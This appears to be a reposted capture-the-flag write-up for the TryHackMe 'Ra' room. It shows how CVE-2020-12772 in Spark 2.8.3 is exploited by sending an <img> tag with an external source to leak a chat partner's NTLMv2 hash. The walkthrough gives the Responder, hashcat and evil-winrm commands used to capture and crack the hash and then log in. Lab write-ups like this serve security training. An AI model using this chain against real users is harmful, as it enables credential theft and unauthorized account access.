# :game_die: Thm Writeup Ra 7E276F05700

> **Original Source:** [Thm Writeup Ra 7E276F05700](https://infosecwriteups.com/thm-writeup-ra-7e276f05700)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

## Spark Exploit (CVE-2020–12772)


I can see that Spark version 2.8.3 was installed. Performing a quick search for exploits related to this version, I found a [Github](https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md) page created by the challenge designers that outlines a vulnerability related to Spark version 2.8.3. According to the vulnerability description provided on the Github page:

>

When we opened a chat with another user, we could send an `<img `tag to that user with an external URL as the source of that image, like this:


`<img src=[external_ip]/test.img>`


## Get Hacktivities’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Each time the user clicks the link, or the ROAR module automatically preloads it, the external server receives the request for the image, together with the NTLM hashes from the user that visits the link, i.e. the user you are chatting with!


By running responder, we could capture the hashes and use them to gain access to the user account and escalate our privileges (depending on the user of course).


To exploit this vulnerability, I started by downloading, installing and running [Spark 2.8.3 app](https://github.com/igniterealtime/Spark/releases).


```
sudo dpkg -i spark_2_8_3.deb
```


After launching Spark, I provided the credentials and domain details.

*Spark Login.*


I also needed to go into advanced settings and check two boxes to avoid getting a certificate error.

*Spark Advanced Settings.*


While enumerating the website earlier, I had noted that the icon for the user Buse Candan was always green, while the other users icons fluctuated between grey and amber. I assumed that this indicated the user was active and could be used to perform the exploit.

*Active user.*


I searched for Buse in contacts on the Spark app and opened a chat window.

*Spark chat with buse.*


Next, I started up responder to capture the NTMLv2 hash for the user Buse and use it to gain access to the user’s account, thus escalating our privileges.

>

Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.


```
python3 /usr/share/responder/Responder.py -I tun0 -rdwv
```


Next, I sent the image tag to the user Buse, as seen below.

*Image Tag.*


Responder captures the GET request from the user Buse to our external host, which includes the user’s NTLMv2 hash!

*Responder captures NTLMv2 Hash for user Buse twice.*


Finally, I can use hashcat to crack the NTLMv2 hash and retrieve the password for the user Buse.


```
hashcat64.exe -m 5600 hash.txt rockyou.txt
```


*Cracked NTLMv2 Hash.*


Using these credentials, I could now attempt to login using evil-winrm and get the second flag.


```
evil-winrm -i windcorp.thm -u buse -p <...........> -N
```


*Flag 2.*

---

*Originally published on [Medium](https://infosecwriteups.com/thm-writeup-ra-7e276f05700). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
